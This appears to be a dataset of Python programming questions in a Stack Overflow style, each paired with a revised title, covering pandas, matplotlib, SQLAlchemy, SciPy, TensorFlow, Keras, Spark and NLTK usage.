Heatmap from panda dataframe," I try to generate a heatmap from a pandas dataframe by days and hours of the day (X-> days, Y->hours).The result should be something like this: the data source is a table in postgres: here is my code the regroup the data by hour. The result looks fine but I can not figure out how to plot this dataframe? <code>  id | created_at ---------+------------------------ 2558145 | 2017-03-02 11:31:15+01 2558146 | 2017-03-02 11:31:46+01 2558147 | 2017-03-02 11:32:28+01 2558148 | 2017-03-02 11:32:57+01.... import pandas as pdfrom sqlalchemy import create_engineengine = create_engine('postgresql://postgres:postgres@localhost:5432/bla')import datetimeimport matplotlib.pyplot as pltimport numpy as np%matplotlib inlinefrom matplotlib.dates import date2numimport seaborn as snsdf = pd.read_sql_query(""""""SELECT created_at, 1 as printFROM fooWHERE created_at > '2017-02-01'AND created_at < '2017-03-01'"""""", con=engine)df['created_at'] = pd.to_datetime(df['created_at'])df.index = df['created_at']df = df.resample('H')['print'].sum()df.fillna(0, inplace=True)print(df.head())created_at2017-02-01 07:00:00+00:00 1.02017-02-01 08:00:00+00:00 152.02017-02-01 09:00:00+00:00 101.02017-02-01 10:00:00+00:00 92.02017-02-01 11:00:00+00:00 184.0Freq: H, Name: print, dtype: float64",Heatmap from columns in pandas dataframe
Sqlalchemy representation for custom postgres type," I have the need for a custom range type. I am trying to represent an hourly range. For each day of the week a range (datetime.time, datetime.time) rather than separate TIME columns, I would like to have access to Postgres/sqlalchemy range operators if possible.I'm looking for something like TSRANGE but hours instead of the normal (datetime.datetime, datetime.datetime)In postgres itself this works wonderfully. For example. So here is the question. How do I represent this custom type I have created in Postgres in SQLAlchemy? Subclass TSRANGE, TypeDecorator on TIME, or possibly create a new SQLALchemy UserDefinedType. I am not quite sure which way to go. Any suggestions would be much appreciated. Thanks! <code>  create type timerange as range (subtype = time);create table schedule ( id integer not null primary key, time_range timerange);insert into schedule values(1, timerange(time '08:00', time '10:00', '[]')),(2, timerange(time '10:00', time '12:00', '[]'));select *from schedulewhere time_range @> time '09:00'",Sqlalchemy representation for custom postgres range type
Flier colors in boxplot," According to the documentation, the Axes.boxplot function takes a dictionary flierprop as argument to define the properties of the outliers. Unfortunately, I can't find the documentation concerning this dictionary. In particular, I would like to define the color of the border of the marker.By default, empty circles are drawn. One can set the face color, as shown in the example. Nevertheless, the circle border is always a black line. I tried with the keys color and markercolor (the former has no effect, the latter produces an error).What should I do to set a color for the marker line? <code> ",Flier colors in boxplot with matplotlib
Flier colors in boxplot matplotlib," According to the documentation, the Axes.boxplot function takes a dictionary flierprop as argument to define the properties of the outliers. Unfortunately, I can't find the documentation concerning this dictionary. In particular, I would like to define the color of the border of the marker.By default, empty circles are drawn. One can set the face color, as shown in the example. Nevertheless, the circle border is always a black line. I tried with the keys color and markercolor (the former has no effect, the latter produces an error).What should I do to set a color for the marker line? <code> ",Flier colors in boxplot with matplotlib
How to automatically annotate maximum value in pyplot?," I'm trying to figure out how I can automatically annotate the maximum value in a figure window. I know you can do this by manually entering in x,y coordinates to annotate whatever point you want using the .annotate() method, but I want the annotation to be automatic, or to find the maximum point by itself.Here's my code so far:  <code>  import matplotlib.pyplot as pltimport numpy as npimport pandas as pdfrom pandas import Series, DataFramedf = pd.read_csv('macrodata.csv') #Read csv file into dataframeyears = df['year'] #Get years columninfl = df['infl'] #Get inflation rate columnfig10 = plt.figure()win = fig10.add_subplot(1,1,1)fig10 = plt.plot(years, infl, lw = 2)fig10 = plt.xlabel(""Years"")fig10 = plt.ylabel(""Inflation"")fig10 = plt.title(""Inflation with Annotations"")",How to automatically annotate maximum value in pyplot
Code optimizationing of python, Is there any ultimate difference between the following two code snippets? The first assigns a value to a variable in a function and then returns that variable. The second function just returns the value directly.Does Python turn them into equivalentbytecode? Is one of them faster?Case 1: Case 2: <code>  def func(): a = 42 return a def func(): return 42,Does Python optimize away a variable that's only used as a return value?
Code optimization in Python, Is there any ultimate difference between the following two code snippets? The first assigns a value to a variable in a function and then returns that variable. The second function just returns the value directly.Does Python turn them into equivalentbytecode? Is one of them faster?Case 1: Case 2: <code>  def func(): a = 42 return a def func(): return 42,Does Python optimize away a variable that's only used as a return value?
Change table to tall format using panda," I have a table like this And using pandas I would like it to be and so onHere I tried it but didnt work with pandas pivot. Above code doesnt work and gives error.  <code>  user company company2 company3 company4 1 Mac Lenovo Hp null 2 Mac MSI Sony user company 1 Mac 1 Lenovo 1 Hp 2 Mac dataframe = pd.read_csv('data.csv')dataframe.fillna(value='', inplace=True)#dataframe.pivot(index='user', columns='company')",Change table to tall format using panda (UNPIVOT)
floyd's algorith to trace the path of shortest distance?," Assume a graph is represented by a n x n dimension adjacency matrix. I know the how to get the shortest path matrix for all pairs. But I wonder is there a way to trace all the shortest paths?Blow is the python code implementation. <code>  v = len(graph)for k in range(0,v): for i in range(0,v): for j in range(0,v): if graph[i,j] > graph[i,k] + graph[k,j]: graph[i,j] = graph[i,k] + graph[k,j]",Floyd-Warshall algorithm: get the shortest paths
Floyd algorith: how to trace the path of shortest distance?," Assume a graph is represented by a n x n dimension adjacency matrix. I know the how to get the shortest path matrix for all pairs. But I wonder is there a way to trace all the shortest paths?Blow is the python code implementation. <code>  v = len(graph)for k in range(0,v): for i in range(0,v): for j in range(0,v): if graph[i,j] > graph[i,k] + graph[k,j]: graph[i,j] = graph[i,k] + graph[k,j]",Floyd-Warshall algorithm: get the shortest paths
Open jp2 gigasized images," I am trying to read and tile a jp2 image file. The image is RGB 98176 x 80656 pixels (it is medical image data). When trying to read the image with glymur I get this error: I understand the image is too big. What I need is to read the image data by tiles and save them elsewhere and in another format.Glymur allows me to read the header using python, so for instance, the code stream is: Tiling doesnt work, the read method doesn't work.Edit:I tried also Scipy which is able to read the header but the same thing, errors that arise are: Is there any way to stream the image data into a different type of container so that the number of indices is not an issue and enables me to process it? <code>  glymur.lib.openjp2.OpenJPEGLibraryError: OpenJPEG library error: Prevent buffer overflow (x1: 80656, y1: 98176) >>> print(codestream.segment[1])SIZ marker segment @ (87, 47) Profile: no profile Reference Grid Height, Width: (98176 x 80656) Vertical, Horizontal Reference Grid Offset: (0 x 0) Reference Tile Height, Width: (832 x 1136) Vertical, Horizontal Reference Tile Offset: (0 x 0) Bitdepth: (8, 8, 8) Signed: (False, False, False) Vertical, Horizontal Subsampling: ((1, 1), (1, 1), (1, 1)) >>> import scipy.misc>>> image=scipy.misc.imread('Sl0.jp2')/home/user/anaconda2/lib/python2.7/site-packages/PIL/Image.py:2274: DecompressionBombWarning: Image size (7717166080 pixels) exceeds limit of 89478485 pixels, could be decompression bomb DOS attack. DecompressionBombWarning)>>> scipy.misc.imwrite('/home/user/Documents/imageCfromjp2.tif',image)/home/user/AttributeError: 'module' object has no attribute 'imwrite'>>> scipy.misc.imsave('/home/user/Documents/imageCfromjp2.tif',image)/home/user/ File ""/home/user/anaconda2/lib/python2.7/site-packages/scipy/misc/pilutil.py"", line 195, in imsave im = toimage(arr, channel_axis=2) File ""/home/user/anaconda2/lib/python2.7/site-packages/scipy/misc/pilutil.py"", line 287, in toimage raise ValueError(""'arr' does not have a suitable array shape for ""ValueError: 'arr' does not have a suitable array shape for any mode.>>> image2=image[0:500,0:500]/home/user/IndexError: too many indices for array>>> image2=image[0:500]/home/user/ValueError: cannot slice a 0-d array","Python open jp2 medical images - Scipy, glymur"
python: pass variable to bash," I am writing a bash script in which a small python script is embedded. I want to pass a variable from python to bash. After a few search I only found method based on os.environ.I just cannot make it work. Here is my simple test. I expected it to output second, however it still outputs first. What is wrong with my script? Also is there any way to pass variable without export?summaryThanks for all answers. Here is my summary. A python script embedded inside bash will run as child process which by definition is not able to affect parent bash environment.The solution is to pass assignment strings out from python and eval it subsequently in bash.An example is  <code>  #!/bin/bashexport myvar='first'python - <<EOFimport osos.environ[""myvar""] = ""second""EOFecho $myvar #!/bin/basha=0b=0assignment_string=$(python -<<EOFvar1=1var2=2print('a={};b={}'.format(var1,var2))EOF)eval $assignment_stringecho $aecho $b",Pass variable from Python to Bash
Python: Alternating between variables each run," I want to use different API keys for data scraping each time my program is run. For instance, I have the following 2 keys: and the following URL: When the program is run, I would like myUrl to be using apiKey1. Once it is run again, I would then like it to use apiKey2 and so forth... i.e:First Run: Second Run: Sorry if this doesn't make sense, but does anyone know a way to do this? I have no idea.EDIT:To avoid confusion, I've had a look at this answer. But this doesn't answer my query. My target is to cycle between the variables between executions of my script. <code>  apiKey1 = ""123abc""apiKey2 = ""345def"" myUrl = http://myurl.com/key=... url = ""http://myurl.com/key="" + apiKey1 url = ""http://myurl.com/key="" + apiKey2",Alternating between variables each run
Is there a way to connecto Sparksql with sqlalchemy," Is there a way to connect Spark-Sql with sqlalchemy I have legacy code that uses sqlalchemyHow could i make it use spark-sql ,can i make sqlalchemy as the translation layer to spark-sql ? <code> ",Is there a way to connecto Spark-Sql with sqlalchemy
Constructing sparse lil_matrix from list of lists of tuples," I have a Python list of row information for a sparse matrix. Each row is represented as a list of (column, value) tuples. Call it alist: How can I efficiently construct a scipy sparse matrix from this list of lists, resulting in a matrix like this: The obvious approach is to make a scipy.sparse.lil_matrix, which internally has this ""list of lists"" structure. But from the scipy.sparse.lil_matrix SciPy v0.19.0 Reference Guide I see just three ways of constructing them:starting from a dense arraystarting from another sparse arrayjust constructing an empty arraySo the only way to get fresh data in is either to solve this problem with some other sparse matrix representation, or to start with a dense array, neither of which address the initial problem, and both of which seem likely to be less efficient representations than lil_matrix itself for this data.I guess I can make an empty one, and use a loop to add values, but surely I'm missing something.The scipy documentation is really frustrating when it comes to sparse matrices. <code>  alist = [[(1,10), (3,-3)], [(2,12)]] 0 10 0 -30 0 12 0",Constructing sparse matrix from list of lists of tuples
Constructing sparse from list of lists of tuples," I have a Python list of row information for a sparse matrix. Each row is represented as a list of (column, value) tuples. Call it alist: How can I efficiently construct a scipy sparse matrix from this list of lists, resulting in a matrix like this: The obvious approach is to make a scipy.sparse.lil_matrix, which internally has this ""list of lists"" structure. But from the scipy.sparse.lil_matrix SciPy v0.19.0 Reference Guide I see just three ways of constructing them:starting from a dense arraystarting from another sparse arrayjust constructing an empty arraySo the only way to get fresh data in is either to solve this problem with some other sparse matrix representation, or to start with a dense array, neither of which address the initial problem, and both of which seem likely to be less efficient representations than lil_matrix itself for this data.I guess I can make an empty one, and use a loop to add values, but surely I'm missing something.The scipy documentation is really frustrating when it comes to sparse matrices. <code>  alist = [[(1,10), (3,-3)], [(2,12)]] 0 10 0 -30 0 12 0",Constructing sparse matrix from list of lists of tuples
what is xtol for in minimize(method=Nelder-Mead)?, The documentation of minimize(method=Nelder-Mead) reads: Absolute error in xopt between iterations that is acceptable for convergence. What does that mean exactly? Are there examples showing how it could be used? <code> ,What is xtol for in minimize(method=Nelder-Mead)?
Python NameError (def) is not defined," I'm having trouble with the following Python code: When I run this code, I getNameError: name 'method1' is not defined.How do I resolve this error? <code>  class Methods: def method1(n): #method1 code def method2(N): #some method2 code for number in method1(1): #more method2 codedef main(): m = Methods for number in m.method2(4): #conditional code goes hereif __name__ == '__main__': main()","How to fix ""NameError: name method-name is not defined""?"
How can I keep a datetime.date in the 'yyyy-mm-dd' format when using Flask's jsonify function?," For some reason, the jsonify function is converting my datetime.date to what appears to be an HTTP date. How can I keep the date in yyyy-mm-dd format when using jsonify? As suggested in the comments, using jsonify(str(test_date)) returns the desired format. However, consider the following case: In this case, the str() solution does not work. <code>  test_date = datetime.date(2017, 4, 27)print(test_date) # 2017-04-27test_date_jsonify = jsonify(test_date)print(test_date_jsonify.get_data(as_text=True)) # Thu, 27 Apr 2017 00:00:00 GMT test_dict = {""name"": ""name1"", ""date"":datetime.date(2017, 4, 27)}print(test_dict) # {""name"": ""name1"", ""date"":datetime.date(2017, 4, 27)}test_dict_jsonify = jsonify(test_dict)print(test_dict_jsonify.get_data(as_text=True)) # {""date"": ""Thu, 27 Apr 2017 00:00:00 GMT"", ""name"": ""name1""}test_dict_jsonify = jsonify(str(test_dict))print(test_dict_jsonify.get_data(as_text=True)) # ""{""date"": datetime.date(2017, 4, 27), ""name"": ""name1""}""",Keep a datetime.date in 'yyyy-mm-dd' format when using Flask's jsonify
Convert probability vector into target vecor in python?," I am doing logistic regression on iris dataset from sklearn, I know the math and try to implement it. At the final step, I get a prediction vector, this prediction vector represents the probability of that data point being to class 1 or class 2 (binary classification). Now I want to turn this prediction vector into target vector. Say if probability is greater than 50%, that corresponding data point will belong to class 1, otherwise class 2. Use 0 to represent class 1, 1 for class 2.I know there is a for loop version of it, just looping through the whole vector. But when the size get large, for loop is very expensive, so I want to do it more efficiently, like numpy's matrix operation, it is faster than doing matrix operation in for loop. Any suggestion on the faster method? <code> ",Convert probability vector into target vector in python?
Multiple comparison operators in single statement," Does this do what I think it does? I couldn't find any reference to this in the docs but I saw it in a high rep answer.It seems to work but it could be luck, like the leftmost resolves to True, then True is used in the other.I did a few tests and it always work as expected, but I'd like to find a source (a doc) stating explicitly that it is intended. This rules out the ""leftmost first"" hypothesis: <code>  assert 1 < 2 < 3 >>> 1<2<3<4<5True>>> 1<2<7<4<5False>>> 1<2<3>2<5True >>> 1<3<2False>>> (1<3)<2True",Multiple comparison operators in single statement (chaining comparison operators)
An Python version of an R ifelse statement," I am trying to learn Python after learning R and an simple ifelse statement. In R I have: But I am unsure how to implement it in Python, I have tried: But this leads to errors, would appreciate some help.  <code>  df$X <- if(df$A == ""-1""){-df$X}else{df$X} df['X'][df['A'] <1] = -[df['X']df['X'][df['A'] >1] = [df['X']",Python version of R's ifelse statement
How to use Bokeh palettes, How to use the D3 Palettes in Bokeh?I tried importing this way but I get an unresolved reference error message Bokeh version: <code>  from bokeh.palettes import Category20 print bokeh.__version__0.11.1,How to import Bokeh palettes
Jupyter notebook Widget Javascript not detected," Question:I installed python3 and jupyter notebook using pip3 in MacOs 10.9.When I try to run the widget it gives error that there is no javascript widget.I have python3 and R kernels installed in Jupyter-notebook. Code: Error: Attempts: The last command gives error. Note that in mac I have jupyter-nbextension command but the command: does not work either.But jupyter nbextension enable widgetsnbextension gives no error and also does nothing. The same error is popped in if I run the code. Also, gives '6.0.0'. Some notes: Related links: How can I install widgets?Do I need to install java separately ?  <code>  from ipywidgets import widgetsfrom IPython.display import displaytext = widgets.Text()display(text)text.on_submit('hello') Widget Javascript not detected. It may not be installed or enabled properly. sudo -H pip3 install ipywidgets sudo -H pip3 install -upgrade ipywidgets jupyter nbextension enable --py widgetsnbextension# restarted the computer. [EnableNBExtensionApp] CRITICAL | Bad config encountered during initialization:[EnableNBExtensionApp] CRITICAL | Unrecognized flag: '--py' jupyter-nbextension enable --py widgetsnbextension import ipywidgetsipywidgets.__version__ which jupyter jupyter is /Library/Frameworks/Python.framework/Versions/3.5/bin/jupyterwhich jupyter-notebookjupyter-notebook is /Library/Frameworks/Python.framework/Versions/3.5/bin/jupyter-notebook https://github.com/jupyter-widgets/ipywidgets/issues/541 https://github.com/jupyter/help/issues/32 https://github.com/jupyter/help/issues/131 https://github.com/binder-project/binder/issues/83 ",Jupyter notebook: Widget Javascript not detected
How to create an abstract class property (potentially read-only) in Python," I have spent a lot of time researching this, but none of the answers seem to work how I would like.I have an abstract class with a class attribute I want each subclass to be forced to implement So that when I do this it throws an error telling me it can't create the class until I implement forceThis.How can I do that?(I don't want the attribute to be read-only, but if that's the only solution, I'll accept it.)For a class method, I've discovered I can do so that at least throws the error TypeError: Can't instantiate abstract class EZ with abstract methods forceThis(Although it doesn't force forceThis to be a class method.)How can I get a similar error to pop up for the class attribute? <code>  class AbstractFoo(): forceThis = 0 class RealFoo(AbstractFoo): pass from abc import ABCMeta, abstractmethodclass AbstractFoo(metaclass=ABCMeta): @classmethod @abstractmethod def forceThis(): """"""This must be implemented"""""" class RealFoo(AbstractFoo): pass",How to create an abstract class attribute (potentially read-only)
How to create an abstract class property (potentially read-only)," I have spent a lot of time researching this, but none of the answers seem to work how I would like.I have an abstract class with a class attribute I want each subclass to be forced to implement So that when I do this it throws an error telling me it can't create the class until I implement forceThis.How can I do that?(I don't want the attribute to be read-only, but if that's the only solution, I'll accept it.)For a class method, I've discovered I can do so that at least throws the error TypeError: Can't instantiate abstract class EZ with abstract methods forceThis(Although it doesn't force forceThis to be a class method.)How can I get a similar error to pop up for the class attribute? <code>  class AbstractFoo(): forceThis = 0 class RealFoo(AbstractFoo): pass from abc import ABCMeta, abstractmethodclass AbstractFoo(metaclass=ABCMeta): @classmethod @abstractmethod def forceThis(): """"""This must be implemented"""""" class RealFoo(AbstractFoo): pass",How to create an abstract class attribute (potentially read-only)
Howe TensorArray and while_loop work together in tensorflow?," I am trying to produce a very easy example for combination of TensorArray and while_loop: But I am getting the following error: Anyone has on idea what is the problem? <code>  # 1000 sequence in the length of 100matrix = tf.placeholder(tf.int32, shape=(100, 1000), name=""input_matrix"")matrix_rows = tf.shape(matrix)[0]ta = tf.TensorArray(tf.float32, size=matrix_rows)ta = ta.unstack(matrix)init_state = (0, ta)condition = lambda i, _: i < nbody = lambda i, ta: (i + 1, ta.write(i,ta.read(i)*2))# run the graphwith tf.Session() as sess: (n, ta_final) = sess.run(tf.while_loop(condition, body, init_state),feed_dict={matrix: tf.ones(tf.float32, shape=(100,1000))}) print (ta_final.stack()) ValueError: Tensor(""while/LoopCond:0"", shape=(), dtype=bool) must be from the same graph as Tensor(""Merge:0"", shape=(), dtype=float32).",How TensorArray and while_loop work together in tensorflow?
What happens to numpy's log function? Any way to improve the performance?," I have a computation project with heavy use of log function (for integers), billions of calls. I find the performance of numpy's log is surprisingly slow.The following code takes 15 to 17 secs to complete: However, the math.log function takes much less time from 3 to 4 seconds. I also tested matlab and C#, which takes about 2 secs and just 0.3 secs respectively. matlab C# Is there any way in python that I can improve the performance of log function? <code>  import numpy as npimport timet1 = time.time()for i in range(1,10000000): np.log(i)t2 = time.time()print(t2 - t1) import mathimport timet1 = time.time()for i in range(1,10000000): math.log(i)t2 = time.time()print(t2 - t1) ticfor i = 1:10000000 log(i);endtoc var t = DateTime.Now;for (int i = 1; i < 10000000; ++i) Math.Log(i);Console.WriteLine((DateTime.Now - t).TotalSeconds);",What happens in numpy's log function? Are there ways to improve the performance?
Keras network compute param," I'm new to Keras and I am trying to create my network which needs to learn on a card game. It takes 93 binary inputs with a hidden layer with 40 neurons and a single output neuron which computes a score (from 0 to 25). I'm trying first to compute (do a forward propagation) of the 93 inputsthis is ""s.toInputs()"" [0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 1 1 1 0 1 0 1 1 0 1 1 1 1 0 1 1 1 1 0 1 1 1 1 0 1 0 0 1 1 0 1 0 0 0 0 0 0 0 0 0 0 1 0 1 0 0 1 1 0 0 0 0 1 0 1 0 0 0 0 0 1 1 0 0 1 1 0 0 1 0 0 0 0 1 1 0 1] but i get the error ValueError: Error when checking : expected dense_1_input to have shape (None, 93) but got array with shape (93, 1)How do I pass the correct parameters? <code>  model = Sequential()model.add(Dense(input_dim=93, units=40, activation=""sigmoid""))model.add(Dense(units=2, activation=""linear""))sgd = optimizers.SGD(lr=0.01, clipvalue=0.5)model.compile(loss=""mse"", optimizer=sgd, learning_rate=0.01) model.predict(np.array(s.toInputs())",Keras input shape error
Seemingly inconsistent column reference syntax for different data frame methods in pandas," I am a little confused as to why the syntax for referring to a column within a pandas data frame differs depending on which method is being called. Take the following sample method chain Here, there are three different kinds of syntax used to refer to columns within the iris data frame:loc, groupby, and agg all understand that a string refers to a column in the data frame.where needs the data frame to be explicitly referenced.Explicitly referring to the data frame in the assign method would cause the operation to be performed on the original iris data frame, and not the copy that has been modified by the calls to loc and where. Here, lambda is needed to refer to the current state of the modified data frame copy.In addition to the above, there is also query, which takes the entire method input as a string: iris.query('SepalLength > 4.6'), but here the pandas documentation explicilty states that this is for special use cases: A use case for query() is when you have a collection of DataFrame objects that have a subset of column names (or index levels/names) in common. You can pass the same query to both frames without having to specify which frame youre interested in queryingTo provide an example of what I mean by consistent data frame column reference syntax, a comparison could be made to the R-package dplyr, where columns in the data frame are referenced with the same syntax for all the piped function calls. Are there advantages that pandas gains from having these different ways of referring to data frame columns, instead of applying the simplistic syntax used by loc, groupby and agg to all the methods (if so, which are these benefits)? Or is this more of a workaround for some underlying issue with using strings for data frame column names in the assign and where methods? <code>  import pandas as pdiris = pd.read_csv('https://raw.githubusercontent.com/mwaskom/seaborn-data/master/iris.csv')iris.columns = ['SepalLength', 'SepalWidth', 'PetalLength', 'PetalWidth', 'Species'](iris .loc[:, ['SepalLength', 'PetalWidth', 'Species']] .where(iris['SepalLength'] > 4.6) .assign(PetalWidthx2 = lambda x_iris: x_iris['PetalWidth'] * 2) .groupby('Species') .agg({'SepalLength': 'mean', 'PetalWidthx2': 'std'})) library(dplyr)# The iris data set is preloaded in Rcolnames(iris) = c('SepalLength', 'SepalWidth', 'PetalLength', 'PetalWidth', 'Species')iris %>% select(SepalLength, PetalWidth, Species) %>% filter(SepalLength > 4.6) %>% mutate(PetalWidth2x = PetalWidth * 2) %>% group_by(Species) %>% summarise(SepalLength = mean(SepalLength), PetalWidth2x = sd(PetalWidth2x))",Seemingly inconsistent column reference syntax when chaining methods on pandas data frames
"""mkvirtualenv"" how its different to ""virtualevn"" in creating virtual environment ?"," I am new to Python virtual environments. Previously I was using the virtualenv command to create virtual environments, but I came across to a tutorial using mkvirtualenv to create a virtual environment. What is the benefit of mkvirtualenv over virtualenv, and how they are different? <code> ",Differences between mkvirtualenv and virtualenv for creating virtual environments
"""mkvirtualenv"" how its different to ""virtualenv"" in creating virtual environment?"," I am new to Python virtual environments. Previously I was using the virtualenv command to create virtual environments, but I came across to a tutorial using mkvirtualenv to create a virtual environment. What is the benefit of mkvirtualenv over virtualenv, and how they are different? <code> ",Differences between mkvirtualenv and virtualenv for creating virtual environments
How to access the value part in a counter objects in pyhon," I am trying to use counter to sort letters by occurrence, and put any that have the same frequency into alphabetical order, but I can't get access to the Value of the dictionary that it produces. produces: How can I get it ordered by frequency, then by alphabetical order, so everything that shows up only once is in alphabetical order? <code>  letter_count = collections.Counter(""alphabet"")print(letter_count) Counter({'a': 2, 'l': 1, 't': 1, 'p': 1, 'h': 1, 'e': 1, 'b': 1})","Sort Counter by frequency, then alphabetically in Python"
"Pyspark, when to cache a dataframe"," My question is, when should I do dataframe.cache() and when it's usefull?Also, in my code should I cache the dataframes in the commented lines?Note: My dataframes are loaded from a Redshift DB.Many thanksHere my code: <code>  def sub_tax_transfer_pricing_eur_aux(manager, dataframe, seq_recs, seq_reservas, df_aux): df_vta = manager.get_dataframe(tables['dwc_oth_v_re_v_impuesto_sap_vta']) df_cpa = manager.get_dataframe(tables['dwc_oth_v_re_v_impuesto_sap_cpa']) dataframe = dataframe.filter(dataframe.seq_rec.isin(seq_recs)) \ .filter(dataframe.seq_reserva.isin(seq_reservas)) ################################################## #SHOULD I CACHE HERE df_vta, df_cpa and dataframe ################################################## dataframe = dataframe.join(df_vta, [dataframe.ind_tipo_imp_vta_fac == df_vta.ind_tipo_imp_vta, dataframe.cod_impuesto_vta_fac == df_vta.cod_impuesto_vta, dataframe.cod_clasif_vta_fac == df_vta.cod_clasif_vta, dataframe.cod_esquema_vta_fac == df_vta.cod_esquema_vta, dataframe.cod_empresa_vta_fac == df_vta.cod_emp_atlas_vta, ]).drop(""ind_tipo_imp_vta"", ""cod_impuesto_vta"", ""cod_clasif_vta"", ""cod_esquema_vta"", ""cod_emp_atlas_vta"") \ .join(df_cpa, [dataframe.ind_tipo_imp_vta_fac == df_cpa.ind_tipo_imp_cpa, dataframe.cod_impuesto_vta_fac == df_cpa.cod_impuesto_cpa, dataframe.cod_clasif_vta_fac == df_cpa.cod_clasif_cpa, dataframe.cod_esquema_vta_fac == df_cpa.cod_esquema_cpa, dataframe.cod_empresa_vta_fac == df_cpa.cod_emp_atlas_cpa, ]).drop(""ind_tipo_imp_cpa"", ""cod_impuesto_cpa"", ""cod_clasif_cpa"", ""cod_esquema_cpa"", ""cod_emp_atlas_cpa"") \ .select(""seq_rec"", ""seq_reserva"", ""ind_tipo_regimen_fac"", ""imp_margen_canal"", ""ind_tipo_regimen_con"", ""imp_coste"", ""imp_margen_canco"", ""imp_venta"", ""pct_impuesto_vta"", ""pct_impuesto_cpa"") ###################################### #SHOULD I CACHE HERE dataframe AGAIN ? ###################################### dataframe = dataframe.withColumn(""amount1"", func.when(dataframe.ind_tipo_regimen_fac == 'E', dataframe.imp_margen_canal * ( 1 - (1 / (1 + (dataframe.pct_impuesto_vta / 100))))) .otherwise(dataframe.imp_venta * ( 1 - (1 / (1 + (dataframe.pct_impuesto_vta / 100)))) - ( dataframe.imp_venta - dataframe.imp_margen_canal) * ( 1 - (1 / (1 + (dataframe.pct_impuesto_cpa / 100)))))) dataframe = dataframe.withColumn(""amount2"", func.when(dataframe.ind_tipo_regimen_con == 'E', dataframe.imp_margen_canco * ( 1 - (1 / (1 + (dataframe.pct_impuesto_vta / 100))))) .otherwise((dataframe.imp_coste + dataframe.imp_margen_canco) * ( 1 - (1 / (1 + (dataframe.pct_impuesto_vta / 100)))) - ( dataframe.imp_coste) * ( 1 - (1 / (1 + (dataframe.pct_impuesto_cpa / 100)))))) dataframe = dataframe.na.fill({'amount1': 0}) dataframe = dataframe.na.fill({'amount2': 0}) dataframe = dataframe.join(df_aux, [dataframe.seq_rec == df_aux.operative_incoming, dataframe.seq_reserva == df_aux.booking_id]) dataframe = dataframe.withColumn(""impuesto_canco1"", udf_currency_exchange(dataframe.booking_currency, func.lit(EUR), dataframe.creation_date, dataframe.amount1)) dataframe = dataframe.withColumn(""impuesto_canco2"", udf_currency_exchange(dataframe.booking_currency, func.lit(EUR), dataframe.creation_date, dataframe.amount2)) dataframe = dataframe.withColumn(""impuesto_canco"", dataframe.impuesto_canco1 + dataframe.impuesto_canco2) dataframe = dataframe.na.fill({'impuesto_canco': 0}) dataframe = dataframe.select(""operative_incoming"", ""booking_id"", ""impuesto_canco"") ###################################### #SHOULD I CACHE HERE dataframe AGAIN ? ###################################### dataframe = dataframe.groupBy(""operative_incoming"", ""booking_id"").agg({'impuesto_canco': 'sum'}). \ withColumnRenamed(""SUM(impuesto_canco)"", ""impuesto_canco"") return dataframe",When to cache a DataFrame?
NLTK word_tokenizer," This is the Code that I am using for semantic analysis of twitter:- Input i.e. a :- getting output ( wordList) in this format:- I want the output of a row in a row format only. How can I do it?If you have a better code for semantic analysis of twitter please share it with me. <code>  import pandas as pdimport datetimeimport numpy as npimport refrom nltk.tokenize import word_tokenizefrom nltk.corpus import stopwordsfrom nltk.stem.wordnet import WordNetLemmatizerfrom nltk.stem.porter import PorterStemmerdf=pd.read_csv('twitDB.csv',header=None, sep=',',error_bad_lines=False,encoding='utf-8')hula=df[[0,1,2,3]]hula=hula.fillna(0)hula['tweet'] = hula[0].astype(str) +hula[1].astype(str)+hula[2].astype(str)+hula[3].astype(str) hula[""tweet""]=hula.tweet.str.lower()ho=hula[""tweet""]ho = ho.replace('\s+', ' ', regex=True) ho=ho.replace('\.+', '.', regex=True)special_char_list = [':', ';', '?', '}', ')', '{', '(']for special_char in special_char_list:ho=ho.replace(special_char, '')print(ho)ho = ho.replace('((www\.[\s]+)|(https?://[^\s]+))','URL',regex=True)ho =ho.replace(r'#([^\s]+)', r'\1', regex=True)ho =ho.replace('\'""',regex=True)lem = WordNetLemmatizer()stem = PorterStemmer()fg=stem.stem(a)eng_stopwords = stopwords.words('english') ho = ho.to_frame(name=None)a=ho.to_string(buf=None, columns=None, col_space=None, header=True, index=True, na_rep='NaN', formatters=None, float_format=None, sparsify=False, index_names=True, justify=None, line_width=None, max_rows=None, max_cols=None, show_dimensions=False)wordList = word_tokenize(fg) wordList = [word for word in wordList if word not in eng_stopwords] print (wordList) tweet0 1495596971.6034188::automotive auto ebc greens...1 1495596972.330948::new free stock photo of cit... tweet 01495596971.6034188::automotiveauto",How to apply NLTK word_tokenize library on a Pandas dataframe for Twitter data?
How to NLTK word_tokenize to a Pandas dataframe for Twitter data?," This is the Code that I am using for semantic analysis of twitter:- Input i.e. a :- getting output ( wordList) in this format:- I want the output of a row in a row format only. How can I do it?If you have a better code for semantic analysis of twitter please share it with me. <code>  import pandas as pdimport datetimeimport numpy as npimport refrom nltk.tokenize import word_tokenizefrom nltk.corpus import stopwordsfrom nltk.stem.wordnet import WordNetLemmatizerfrom nltk.stem.porter import PorterStemmerdf=pd.read_csv('twitDB.csv',header=None, sep=',',error_bad_lines=False,encoding='utf-8')hula=df[[0,1,2,3]]hula=hula.fillna(0)hula['tweet'] = hula[0].astype(str) +hula[1].astype(str)+hula[2].astype(str)+hula[3].astype(str) hula[""tweet""]=hula.tweet.str.lower()ho=hula[""tweet""]ho = ho.replace('\s+', ' ', regex=True) ho=ho.replace('\.+', '.', regex=True)special_char_list = [':', ';', '?', '}', ')', '{', '(']for special_char in special_char_list:ho=ho.replace(special_char, '')print(ho)ho = ho.replace('((www\.[\s]+)|(https?://[^\s]+))','URL',regex=True)ho =ho.replace(r'#([^\s]+)', r'\1', regex=True)ho =ho.replace('\'""',regex=True)lem = WordNetLemmatizer()stem = PorterStemmer()fg=stem.stem(a)eng_stopwords = stopwords.words('english') ho = ho.to_frame(name=None)a=ho.to_string(buf=None, columns=None, col_space=None, header=True, index=True, na_rep='NaN', formatters=None, float_format=None, sparsify=False, index_names=True, justify=None, line_width=None, max_rows=None, max_cols=None, show_dimensions=False)wordList = word_tokenize(fg) wordList = [word for word in wordList if word not in eng_stopwords] print (wordList) tweet0 1495596971.6034188::automotive auto ebc greens...1 1495596972.330948::new free stock photo of cit... tweet 01495596971.6034188::automotiveauto",How to apply NLTK word_tokenize library on a Pandas dataframe for Twitter data?
